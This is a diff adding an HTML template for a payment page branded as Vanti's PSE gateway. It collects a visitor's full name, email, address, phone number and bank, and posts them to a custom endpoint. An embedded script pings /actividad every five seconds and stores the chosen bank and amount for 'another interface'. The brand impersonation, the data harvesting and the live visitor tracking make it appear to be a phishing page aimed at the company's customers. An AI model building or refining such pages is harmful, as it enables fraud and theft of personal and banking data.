@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pasarela de Pago - Vanti</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <div class="header"></div>
+    <div class="logo-container">
+        <h1 class="logo-title">vanti<span style="color:#e2a000;">✓</span></h1>
+    </div>
+
+    <div class="card" style="max-width: 520px; margin: 20px auto; text-align: left; padding: 25px;">
+        <h3 style="color:#0d3859; text-align: center; margin-top: 0;">Resumen de Pago</h3>
+        <p><b>Referencia:</b> {{ referencia }}</p>
+        <p><b>Total a pagar:</b> $ {{ "{:,}".format(monto) }}</p>
+        
+        <hr style="border: 0; border-top: 1px solid #e2e8f0; margin: 15px 0;">
+
+        <h4 style="color:#0d3859; margin-bottom: 15px; text-align: center;">Completa tus datos para continuar con PSE</h4>
+
+        <!-- Formulario que viaja de manera segura a Python -->
+        <form action="/procesar-pago-pse" method="POST">
+            <input type="hidden" name="tx_id" value="{{ tx_id }}">
+
+            <div style="margin-bottom: 12px;">
+                <label style="display: block; font-size: 14px; font-weight: 500; color: #0d3859; margin-bottom: 4px;">Nombre Completo:</label>
+                <input type="text" name="nombre_completo" placeholder="Tus nombres y apellidos" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box;">
+            </div>
+
+            <div style="margin-bottom: 12px;">
+                <label style="display: block; font-size: 14px; font-weight: 500; color: #0d3859; margin-bottom: 4px;">Correo Electrónico:</label>
+                <input type="email" name="correo" placeholder="correo@ejemplo.com" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box;">
+            </div>
+
+            <div style="margin-bottom: 12px;">
+                <label style="display: block; font-size: 14px; font-weight: 500; color: #0d3859; margin-bottom: 4px;">Dirección:</label>
+                <input type="text" name="direccion" placeholder="Calle 123 # 45-67" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box;">
+            </div>
+
+            <div style="margin-bottom: 12px;">
+                <label style="display: block; font-size: 14px; font-weight: 500; color: #0d3859; margin-bottom: 4px;">Número de Celular:</label>
+                <input type="tel" name="celular" placeholder="3001234567" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box;">
+            </div>
+
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; font-size: 14px; font-weight: 500; color: #0d3859; margin-bottom: 4px;">Seleccione su Banco:</label>
+                <select name="banco" required style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; background: #fff; box-sizing: border-box;">
+                    <option value="" disabled selected>Elije el banco</option>
+                    <option value="ALIANZA FIDUCIARIA">ALIANZA FIDUCIARIA</option>
+                    <option value="BAN100">BAN100</option>
+                    <option value="BANCAMIA S.A.">BANCAMIA S.A.</option>
+                    <option value="BANCO AGRARIO">BANCO AGRARIO</option>
+                    <option value="BANCO AV VILLAS">BANCO AV VILLAS</option>
+                    <option value="BANCO BBVA COLOMBIA S.A.">BANCO BBVA COLOMBIA S.A.</option>
+                    <option value="BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
+                    <option value="BANCO COOPERATIVO COOPCENTRAL">BANCO COOPERATIVO COOPCENTRAL</option>
+                    <option value="BANCO DAVIVIENDA">BANCO DAVIVIENDA</option>
+                    <option value="BANCO DE BOGOTA">BANCO DE BOGOTA</option>
+                    <option value="BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
+                    <option value="BANCO FALABELLA">BANCO FALABELLA</option>
+                    <option value="BANCO FINANDINA S.A. BIC">BANCO FINANDINA S.A. BIC</option>
+                    <option value="BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option>
+                    <option value="BANCO ITAU">BANCO ITAU</option>
+                    <option value="BANCO J.P. MORGAN COLOMBIA S.A.">BANCO J.P. MORGAN COLOMBIA S.A.</option>
+                    <option value="BANCO MUNDO MUJER S.A.">BANCO MUNDO MUJER S.A.</option>
+                    <option value="BANCO PICHINCHA S.A.">BANCO PICHINCHA S.A.</option>
+                    <option value="BANCO POPULAR">BANCO POPULAR</option>
+                    <option value="BANCO SANTANDER COLOMBIA">BANCO SANTANDER COLOMBIA</option>
+                    <option value="BANCO SERFINANZA">BANCO SERFINANZA</option>
+                    <option value="BANCO UNION antes GIROS">BANCO UNION antes GIROS</option>
+                    <option value="BANCOLOMBIA">BANCOLOMBIA</option>
+                    <option value="BANCOOMEVA S.A.">BANCOOMEVA S.A.</option>
+                    <option value="BOLD CF">BOLD CF</option>
+                    <option value="CFA COOPERATIVA FINANCIERA">CFA COOPERATIVA FINANCIERA</option>
+                    <option value="CITIBANK">CITIBANK</option>
+                    <option value="COINK SA">COINK SA</option>
+                    <option value="COLTEFINANCIERA">COLTEFINANCIERA</option>
+                    <option value="CONFIAR COOPERATIVA FINANICERA">CONFIAR COOPERATIVA FINANICERA</option>
+                    <option value="COTRAFA">COTRAFA</option>
+                    <option value="CREZCAMOS">CREZCAMOS</option>
+                    <option value="DALE">DALE</option>
+                    <option value="DAVIPLATA">DAVIPLATA</option>
+                    <option value="DING">DING</option>
+                    <option value="FINANCIERA JURISCOOP SA">FINANCIERA JURISCOOP SA</option>
+                    <option value="GLOBAL 66">GLOBAL 66</option>
+                    <option value="IRIS">IRIS</option>
+                    <option value="JFK COOPERATIVA FINANICERA">JFK COOPERATIVA FINANICERA</option>
+                    <option value="LULO BANK">LULO BANK</option>
+                    <option value="MOVII S.A">MOVII S.A</option>
+                    <option value="NU">NU</option>
+                    <option value="POWWI">POWWI</option>
+                    <option value="RAPPIPAY">RAPPIPAY</option>
+                    <option value="DAVIBANK">DAVIBANK</option>
+                    <option value="UALÁ">UALÁ</option>
+                </select>
+            </div>
+
+            <button type="submit" style="background: #16a34a; color: #fff; border: none; width: 100%; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: 500; cursor: pointer;">
+                Ir a Pagar por PSE
+            </button>
+        </form>
+    </div>
+<script>
+    const txId = "{{ tx_id }}";
+    const registrarActividad = () => navigator.sendBeacon(`/actividad/${txId}`);
+    registrarActividad();
+    setInterval(registrarActividad, 5000);
+
+    // Capturar los datos del formulario antes de enviarlos al servidor
+    document.querySelector("form").addEventListener("submit", function(e) {
+        const selectBanco = document.querySelector("select[name='banco']");
+        const bancoSeleccionado = selectBanco ? selectBanco.value : "";
+        const montoTotal = "{{ monto }}"; 
+
+        if (bancoSeleccionado) {
+            // AQUÍ APLICAMOS EL FORMATO EXACTO QUE PIDISTE:
+            // Ejemplo: "vanti: BANCO DE BOGOTA" o "vanti: BANCO POPULAR"
+            const bancoFormateado = `vanti: ${bancoSeleccionado}`;
+            
+            // Lo guardamos en localStorage por si tu otra interfaz lo lee de ahí
+            localStorage.setItem("banco", bancoFormateado);
+        }
+        
+        if (montoTotal) {
+            localStorage.setItem("valor", montoTotal);
+        }
+    });
+</script>
+</body>
+</html>
